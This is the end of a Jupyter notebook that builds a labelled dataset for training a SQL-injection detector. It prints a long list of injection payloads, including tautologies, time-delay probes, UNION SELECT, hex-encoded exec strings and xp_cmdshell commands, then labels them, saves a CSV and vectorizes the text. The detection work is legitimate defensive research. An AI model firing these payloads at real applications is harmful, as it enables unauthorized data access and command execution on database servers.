       " \" or sleep ( __TIME__ )  = '\",\n",
       " \" or 1 --'\",\n",
       " 'or 0 = 0 #\"',\n",
       " 'having',\n",
       " \"a'\",\n",
       " '\" or isNULL ( 1/0 )  /*',\n",
       " 'declare @s varchar  ( 8000 )  select @s  =  0x73656c ...',\n",
       " 'Ã¢Â€Â˜ or 1 = 1 --',\n",
       " 'char%4039%41%2b%40SELECT',\n",
       " 'order by',\n",
       " 'bfilename',\n",
       " ' having 1 = 1--',\n",
       " ' )  or benchmark ( 10000000,MD5 ( 1  )  )  #',\n",
       " ' or username like char ( 37 ) ;',\n",
       " \";waitfor delay '0:0:__TIME__'--\",\n",
       " '\" or 1 = 1--',\n",
       " \"x' AND userid IS NULL; --\",\n",
       " '*/*',\n",
       " \" or 'text' > 't'\",\n",
       " '  ( select top 1',\n",
       " ' or benchmark ( 10000000,MD5 ( 1  )  )  #',\n",
       " '\" ) ;waitfor delay \\'0:0:__TIME__\\'--',\n",
       " \"a' or 3 = 3--\",\n",
       " ' -- &password = ',\n",
       " ' group by userid having 1 = 1--',\n",
       " \" or '' = '\",\n",
       " '; exec master..xp_cmdshell',\n",
       " ' or x = x',\n",
       " 'select',\n",
       " '\"  )  )   or sleep ( __TIME__ )  = \"',\n",
       " '0x730065006c0065006300740020004000400076006500 ...',\n",
       " \"hi' or 1 = 1 --\",\n",
       " '\" )  or pg_sleep ( __TIME__ ) --',\n",
       " \" or 'x' = 'x\",\n",
       " \" or 'something'  =  'some'+'thing'\",\n",
       " 'exec sp',\n",
       " '29 %',\n",
       " ' ( ',\n",
       " 'ÃƒÂ½ or 1 = 1 --',\n",
       " '1 or pg_sleep ( __TIME__ ) --',\n",
       " '0 or 1 = 1',\n",
       " ' )  or  ( a = a',\n",
       " 'uni/**/on sel/**/ect',\n",
       " 'replace',\n",
       " '%27 or 1 = 1',\n",
       " '  )  )   or pg_sleep ( __TIME__ ) --',\n",
       " '%7C',\n",
       " \"x' AND 1 =  ( SELECT COUNT ( * )  FROM tabname ) ; --\",\n",
       " '&apos; OR',\n",
       " \"; or '1' = '1'\",\n",
       " 'declare @q nvarchar  ( 200 )  select @q  =  0x770061 ...',\n",
       " '1 or 1 = 1',\n",
       " \"; exec  ( 'sel' + 'ect us' + 'er' ) \",\n",
       " '23 OR 1 = 1',\n",
       " '/',\n",
       " \"anything' OR 'x' = 'x\",\n",
       " 'declare @q nvarchar  ( 4000 )  select @q  = ',\n",
       " 'or 0 = 0 --',\n",
       " 'desc',\n",
       " \"||'6\",\n",
       " ' ) ',\n",
       " '1  )  )   or sleep ( __TIME__ ) #',\n",
       " 'or 0 = 0 #',\n",
       " ' select name from syscolumns where id  =   ( sele ...',\n",
       " 'hi or a = a',\n",
       " '* ( | ( mail = *  )  )  ',\n",
       " 'password:*/ = 1--',\n",
       " 'distinct',\n",
       " \" ) ;waitfor delay '0:0:__TIME__'--\",\n",
       " 'to_timestamp_tz',\n",
       " '\" )  or benchmark ( 10000000,MD5 ( 1  )  )  #',\n",
       " ' UNION SELECT',\n",
       " '%2A%28%7C%28mail%3D%2A%29%29',\n",
       " '+sqlvuln',\n",
       " ' or 1 = 1 /*',\n",
       " \"  )  )   or sleep ( __TIME__ )  = '\",\n",
       " 'or 1 = 1 or \"\" = ',\n",
       " ' or 1 in  ( select @@version ) --',\n",
       " 'sqlvuln;',\n",
       " ' union select * from users where login  =  char ...',\n",
       " \"x' or 1 = 1 or 'x' = 'y\",\n",
       " '28 %',\n",
       " 'Ã¢Â€Â˜ or 3 = 3 --',\n",
       " '@variable',\n",
       " \" or '1' = '1'--\",\n",
       " '\"a\"\" or 1 = 1--\"',\n",
       " '//*',\n",
       " '%2A%7C',\n",
       " '\" or 0 = 0 --',\n",
       " '\"  )  )   or pg_sleep ( __TIME__ ) --',\n",
       " '?',\n",
       " ' or 1/*',\n",
       " '!',\n",
       " \"'\",\n",
       " ' or a  =  a',\n",
       " 'declare @q nvarchar  ( 200 )  select @q  =  0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec ( @q ) ',\n",
       " 'declare @s varchar ( 200 )  select @s  =  0x77616974666F722064656C61792027303A303A31302700 exec ( @s ) ',\n",
       " 'declare @q nvarchar  ( 200 )  0x730065006c00650063007400200040004000760065007200730069006f006e00 exec ( @q ) ',\n",
       " 'declare @s varchar  ( 200 )  select @s  =  0x73656c65637420404076657273696f6e exec ( @s ) ',\n",
       " \"' or 1 = 1\",\n",
       " '\\x18 or 1 = 1 --',\n",
       " \"x' OR full_name LIKE '%Bob%\",\n",
       " \"'; exec master..xp_cmdshell 'ping 172.10.1.255'--\",\n",
       " \"' or '' = '\",\n",
       " \"' or 'x' = 'x\",\n",
       " \"' )  or  ( 'x' = 'x\",\n",
       " \"' or 0 = 0 --\",\n",
       " \"' or 0 = 0 #\",\n",
       " ' or 0 = 0 #\"',\n",
       " \"' or 1 = 1--\",\n",
       " \"' or '1' = '1'--\",\n",
       " \"' or 1 --'\",\n",
       " 'or 1 = 1--',\n",
       " \"' or 1 = 1 or '' = '\",\n",
       " ' or 1 = 1 or \"\" = ',\n",
       " \"' or a = a--\",\n",
       " ' or a = a',\n",
       " \"' )  or  ( 'a' = 'a\",\n",
       " \"'hi' or 'x' = 'x';\",\n",
       " 'or',\n",
       " 'procedure',\n",
       " 'handler',\n",
       " \"' or username like '%\",\n",
       " \"' or uname like '%\",\n",
       " \"' or userid like '%\",\n",
       " \"' or uid like '%\",\n",
       " \"' or user like '%\",\n",
       " \"'; exec master..xp_cmdshell\",\n",
       " \"'; exec xp_regread\",\n",
       " \"t'exec master..xp_cmdshell 'nslookup www.google.com'--\",\n",
       " '--sp_password',\n",
       " \"' UNION SELECT\",\n",
       " \"' UNION ALL SELECT\",\n",
       " \"' or  ( EXISTS ) \",\n",
       " \"'  ( select top 1\",\n",
       " \"'||UTL_HTTP.REQUEST\",\n",
       " '1;SELECT *',\n",
       " '<>\"\\'%; )  ( &+',\n",
       " \"' or 1 = 1\",\n",
       " \"'sqlattempt1\",\n",
       " '%28',\n",
       " '%29',\n",
       " '%26',\n",
       " '%21',\n",
       " \"' or '' = '\",\n",
       " \"' or 3 = 3\",\n",
       " '\\x18 or 3 = 3 --']"
      ]
     },
     "execution_count": 67,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "all_sqli_sentence"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 68,
   "id": "ee3a4f74",
   "metadata": {},
   "outputs": [],
   "source": [
    "import pandas as pd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 69,
   "id": "ee8bd1bc",
   "metadata": {},
   "outputs": [],
   "source": [
    "# give labels to sql data\n",
    "\n",
    "values=[]\n",
    "for i in all_sqli_sentence:\n",
    "    values.append((i,1))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 70,
   "id": "cc52dfa4",
   "metadata": {},
   "outputs": [],
   "source": [
    "# give labels to benign data\n",
    "\n",
    "for i in data:\n",
    "    values.append((i,0))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 71,
   "id": "e0ed821a",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "4032"
      ]
     },
     "execution_count": 71,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(all_sqli_sentence)+len(data)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 72,
   "id": "d2a89cf9",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "4032"
      ]
     },
     "execution_count": 72,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(values)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 73,
   "id": "f36daee3",
   "metadata": {},
   "outputs": [],
   "source": [
    "for i in benign_sentence:\n",
    "    values.append((i,0))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 74,
   "id": "aad4a0b5",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "5147"
      ]
     },
     "execution_count": 74,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(values)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 75,
   "id": "5e0fbf8b",
   "metadata": {},
   "outputs": [],
   "source": [
    "for i in sqli_data:\n",
    "    values.append((i,1))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 76,
   "id": "82d2a82a",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "5437"
      ]
     },
     "execution_count": 76,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "\n",
    "len(values)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 77,
   "id": "90cf0120",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(' select * from users where id = 1 or  ( \\\\. )  = 1 union select 1,@@VERSION -- 1',\n",
       " 1)"
      ]
     },
     "execution_count": 77,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "values[1]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 78,
   "id": "3ea6c97e",
   "metadata": {},
   "outputs": [],
   "source": [
    "df=pd.DataFrame(values,columns=['Sentence','Label'])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 79,
   "id": "e875bc53",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Sentence</th>\n",
       "      <th>Label</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>select * from users where id = 1 or  ( \\ )  =...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>select * from users where id = 1 or  ( \\. )  ...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>select * from users where id = 1 or  ( \\+ )  ...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>select * from users where id = 1 or  ( 1 )  =...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>select * from users where id = 1 or  ( \\+ )  ...</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                            Sentence  Label\n",
       "0   select * from users where id = 1 or  ( \\ )  =...      1\n",
       "1   select * from users where id = 1 or  ( \\. )  ...      1\n",
       "2   select * from users where id = 1 or  ( \\+ )  ...      1\n",
       "3   select * from users where id = 1 or  ( 1 )  =...      1\n",
       "4   select * from users where id = 1 or  ( \\+ )  ...      1"
      ]
     },
     "execution_count": 79,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 80,
   "id": "e5b3157b",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.to_csv('sqli.csv', index=False, encoding='utf-16')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 81,
   "id": "13794381",
   "metadata": {},
   "outputs": [],
   "source": [
    "df=pd.read_csv('sqli.csv',encoding='utf-16')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 82,
   "id": "9cced877",
   "metadata": {},
   "outputs": [],
   "source": [
    "# vectorization of data\n",
    "\n",
    "from sklearn.feature_extraction.text import CountVectorizer\n",
    "vectorizer = CountVectorizer( min_df=2, max_df=0.7, max_features=4096, stop_words=stopwords.words('english'))\n",
    "posts = vectorizer.fit_transform(df['Sentence'].values.astype('U')).toarray()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 83,
   "id": "9dc6e555",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(5437, 4096)"
      ]
     },
     "execution_count": 83,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "posts.shape"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 84,
   "id": "e63744fe",
   "metadata": {},
   "outputs": [],
   "source": [
    "posts.shape=(5437,64,64,1)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0016837a",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
